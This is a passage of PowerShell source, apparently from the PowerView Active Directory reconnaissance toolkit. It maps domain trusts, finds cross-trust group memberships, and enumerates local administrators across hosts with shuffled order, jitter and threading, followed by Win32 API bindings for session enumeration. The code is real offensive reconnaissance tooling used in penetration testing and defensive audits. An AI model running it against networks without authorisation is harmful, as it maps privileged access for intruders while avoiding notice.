        Return trusts for the specified forest.

        .EXAMPLE
        > Get-NetForestTrusts
        Return current forest trusts.

        .EXAMPLE
        > Get-NetForestTrusts -Forest "test"
        Return trusts for the "test" forest.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Forest
    )

    $f = (Get-NetForest -Forest $Forest)
    if($f){
        $f.GetAllTrustRelationships()
    }
}


function Invoke-FindUserTrustGroups {
    <#
        .SYNOPSIS
        Enumerates users who are in groups outside of their
        principal domain.

        .DESCRIPTION
        This function queries the domain for all users objects,
        extract the memberof groups for each users, and compares
        found memberships to the user's current domain.
        Any group memberships outside of the current domain
        are output.

        .PARAMETER UserName
        Username to filter results for, wildcards accepted.

        .PARAMETER Domain
        Domain to query for users.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]
        $UserName,

        [string]
        $Domain
    )

    if ($Domain){
        # get the domain name into distinguished form
        $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
    }
    else {
        $DistinguishedDomainName = [string] ([adsi]'').distinguishedname
        $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
    }

    # query for the primary domain controller so we can extract the domain SID for filtering
    $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
    $PrimaryDCSID = (Get-NetComputers -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
    $parts = $PrimaryDCSID.split("-")
    $DomainSID = $parts[0..($parts.length -2)] -join "-"

    Get-NetUser -Domain $Domain -UserName $UserName | % {
        foreach ($membership in $_.memberof) {
            $index = $membership.IndexOf("DC=")
            if($index) {
                
                $GroupDomain = $($membership.substring($index)) -replace 'DC=','' -replace ',','.'
                
                if ($GroupDomain.CompareTo($Domain)) {

                    $GroupName = $membership.split(",")[0].split("=")[1]
                    $out = new-object psobject
                    $out | add-member Noteproperty 'UserDomain' $Domain
                    $out | add-member Noteproperty 'UserName' $_.samaccountname
                    $out | add-member Noteproperty 'GroupDomain' $GroupDomain
                    $out | add-member Noteproperty 'GroupName' $GroupName
                    $out | add-member Noteproperty 'GroupDN' $membership
                    $out
                }
            }
        }
    }
}


function Invoke-FindGroupTrustUsers {
    <#
        .SYNOPSIS
        Enumerates all the members of a given domain's groups
        and finds users that are not in the queried domain.

        .PARAMETER Domain
        Domain to query for groups.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]
        $Domain
    )

    if(-not $Domain){
        $Domain = (Get-NetDomain).Name
    }

    $DomainDN = "DC=$($Domain.Replace('.', ',DC='))"
    write-verbose "DomainDN: $DomainDN"

    # standard group names to ignore
    $ExcludeGroups = @("Users", "Domain Users", "Guests")

    # get all the groupnames for the given domain
    $groups = Get-NetGroups -Domain $Domain | Where-Object { -not ($ExcludeGroups -contains $_) }

    # filter for foreign SIDs in the cn field for users in another domain,
    #   or if the DN doesn't end with the proper DN for the queried domain
    $groupUsers = $groups | Get-NetGroup -Domain $Domain -FullData | ? { 
        ($_.distinguishedName -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.distinguishedname.substring($_.distinguishedname.IndexOf("DC="))))
    }

    $groupUsers | % {    
        if ($_.samAccountName){
            # forest users have the samAccountName set
            $userName = $_.sAMAccountName
        }
        else {
            # external trust users have a SID, so convert it
            try {
                $userName = Convert-SidToName $_.cn
            }
            catch {
                # if there's a problem contacting the domain to resolve the SID
                $userName = $_.cn
            }
        }

        # extract the FQDN from the Distinguished Name
        $userDomain = $_.distinguishedName.subString($_.distinguishedName.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

        $out = new-object psobject
        $out | add-member Noteproperty 'GroupDomain' $Domain
        $out | add-member Noteproperty 'GroupName' $_.GroupName
        $out | add-member Noteproperty 'UserDomain' $userDomain
        $out | add-member Noteproperty 'UserName' $userName
        $out | add-member Noteproperty 'UserDN' $_.distinguishedName
        $out
    }
}


function Invoke-FindAllUserTrustGroups {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships and
        enumerates all users who are in groups outside of their
        principal domain.

        .DESCRIPTION
        This function tries to map all domain trusts, and then
        queries the domain for all users objects, extracting the
        memberof groups for each users, and compares
        found memberships to the user's current domain.
        Any group memberships outside of the current domain
        are output.

        .PARAMETER UserName
        Username to filter results for, wildcards accepted.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]
        $UserName
    )

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            Write-Verbose "Enumerating domain $d"

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            # get the trust groups for this domain
            if ($UserName){
                Invoke-FindUserTrustGroups -Domain $d -UserName $UserName

            }
            else{
                Invoke-FindUserTrustGroups -Domain $d
            }

            try{
                # get all the trusts for this domain
                $trusts = Get-NetDomainTrusts -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $target = $trust.TargetName
                        # make sure we process the target
                        $domains.push($target) | out-null
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Invoke-FindAllGroupTrustUsers {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships and
        enumerate all the members of a given domain's groups
        and finds users that are not in the queried domain.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param()

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            Write-Verbose "Enumerating domain $d"

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            # get the group trust user for this domain
            Invoke-FindGroupTrustUsers -Domain $d

            try{
                # get all the trusts for this domain
                $trusts = Get-NetDomainTrusts -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $target = $trust.TargetName
                        # make sure we process the target
                        $domains.push($target) | out-null
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Invoke-EnumerateLocalTrustGroups {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain that are not a part of
        the local machine or the machine's domain. That is, all
        local accounts across a trust.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3.

        .PARAMETER Domain
        Domain to query for systems.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalTrustGroups with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # random object for delay
        $randNo = New-Object System.Random

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # find all group names that have one or more users in another domain
        $TrustGroups = Invoke-FindGroupTrustUsers -Domain $domain | % { $_.GroupName } | Sort-Object -Unique

        $TrustGroupsSIDS = $TrustGroups | % { 
            # ignore the builtin administrators group for a DC
            Get-NetGroups -Domain $Domain -GroupName $_ -FullData | ? { $_.objectsid -notmatch "S-1-5-32-544" } | % { $_.objectsid }
        }

        # query for the primary domain controller so we can extract the domain SID for filtering
        $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
        $PrimaryDCSID = (Get-NetComputers -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
        $parts = $PrimaryDCSID.split("-")
        $DomainSID = $parts[0..($parts.length -2)] -join "-"
    }

    process{

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # grab the users for the local admins on this server
            $localAdmins = Get-NetLocalGroup -HostName $server

            # get the local machine SID
            $LocalSID = ($localAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"

            # filter out accounts that begin with the machine SID and domain SID
            #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
            $LocalAdmins | Where-Object { ($TrustGroupsSIDS -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
        }
    }
}


function Invoke-EnumerateLocalTrustGroupsThreaded {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain that are not a part of
        the local machine or the machine's domain. That is, all
        local accounts across a trust. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function queries the domain for all active machines with
        Get-NetComputers, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for systems.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [string]
        $OutFile,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdminsThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # find all group names that have one or more users in another domain
        $TrustGroups = Invoke-FindGroupTrustUsers -Domain $domain | % { $_.GroupName } | Sort-Object -Unique

        $TrustGroupsSIDS = $TrustGroups | % { 
            # ignore the builtin administrators group for a DC
            Get-NetGroups -Domain $Domain -GroupName $_ -FullData | ? { $_.objectsid -notmatch "S-1-5-32-544" } | % { $_.objectsid }
        }

        # query for the primary domain controller so we can extract the domain SID for filtering
        $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
        $PrimaryDCSID = (Get-NetComputers -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
        $parts = $PrimaryDCSID.split("-")
        $DomainSID = $parts[0..($parts.length -2)] -join "-"

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $DomainSID, $TrustGroupsSIDS, $Ping)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # grab the users for the local admins on this server
                $localAdmins = Get-NetLocalGroup -HostName $server

                # get the local machine SID
                $LocalSID = ($localAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"

                # filter out accounts that begin with the machine SID and domain SID
                #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
                $LocalAdmins | Where-Object { ($TrustGroupsSIDS -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # param($Server, $DomainSID, $TrustGroupsSIDS, $Ping)

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('DomainSID', $DomainSID).AddParameter('TrustGroupsSIDS', $TrustGroupsSIDS).AddParameter('Ping', -not $NoPing)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-MapDomainTrusts {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships.

        .DESCRIPTION
        This function gets all trusts for the current domain,
        and tries to get all trusts for each domain it finds.

        .EXAMPLE
        > Invoke-MapDomainTrusts
        Return a "domain1,domain2,trustType,trustDirection" list

        .LINK
        http://blog.harmj0y.net/
    #>

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            try{
                # get all the trusts for this domain
                $trusts = Get-NetDomainTrusts -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $source = $trust.SourceName
                        $target = $trust.TargetName
                        $type = $trust.TrustType
                        $direction = $trust.TrustDirection

                        # make sure we process the target
                        $domains.push($target) | out-null

                        # build the nicely-parsable custom output object
                        $out = new-object psobject
                        $out | add-member Noteproperty 'SourceDomain' $source
                        $out | add-member Noteproperty 'TargetDomain' $target
                        $out | add-member Noteproperty 'TrustType' "$type"
                        $out | add-member Noteproperty 'TrustDirection' "$direction"
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Invoke-MapDomainTrustsLDAP {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships
        through LDAP queries.

        .EXAMPLE
        > Invoke-MapDomainTrustsLDAP
        Return a "domain1,domain2,trustType,trustDirection" list

        .LINK
        http://blog.harmj0y.net/
    #>

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            try{
                # get all the trusts for this domain through LDAP queries
                $trusts = Get-NetDomainTrustsLDAP -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $source = $trust.SourceName
                        $target = $trust.TargetName
                        $type = $trust.TrustType
                        $direction = $trust.TrustDirection

                        # make sure we process the target
                        $domains.push($target) | out-null

                        # build the nicely-parsable custom output object
                        $out = new-object psobject
                        $out | add-member Noteproperty 'SourceDomain' $source
                        $out | add-member Noteproperty 'TargetDomain' $target
                        $out | add-member Noteproperty 'TrustType' $type
                        $out | add-member Noteproperty 'TrustDirection' $direction
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}



# expose the Win32API functions and datastructures below
# using PSReflect

$Mod = New-InMemoryModule -ModuleName Win32

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetFileEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetConnectionEnum ([Int]) @([string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([string], [string], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([string])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)

$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}

# the NetFileEnum result structure
$FILE_INFO_3 = struct $Mod FILE_INFO_3 @{
    fi3_id = field 0 UInt32
    fi3_permissions = field 1 UInt32
    fi3_num_locks = field 2 UInt32
    fi3_pathname = field 3 String -MarshalAs @('LPWStr')
    fi3_username = field 4 String -MarshalAs @('LPWStr')
}

# the NetConnectionEnum result structure
$CONNECTION_INFO_1 = struct $Mod CONNECTION_INFO_1 @{
    coni1_id = field 0 UInt32
    coni1_type = field 1 UInt32
    coni1_num_opens = field 2 UInt32
    coni1_num_users = field 3 UInt32
    coni1_time = field 4 UInt32
    coni1_username = field 5 String -MarshalAs @('LPWStr')
    coni1_netname = field 6 String -MarshalAs @('LPWStr')
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$Wtsapi32 = $Types['wtsapi32']
